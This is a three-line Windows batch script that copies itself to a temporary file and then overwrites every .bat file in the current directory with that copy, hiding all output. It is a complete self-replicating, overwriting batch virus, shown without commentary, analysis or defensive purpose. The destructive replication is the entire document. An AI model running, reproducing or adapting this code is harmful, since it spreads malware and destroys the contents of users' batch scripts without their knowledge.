@echo off
copy %0 %temp%\xxx.xxx>nul
for %%f in (*.bat) do copy %temp%\xxx.xxx %%f>nul
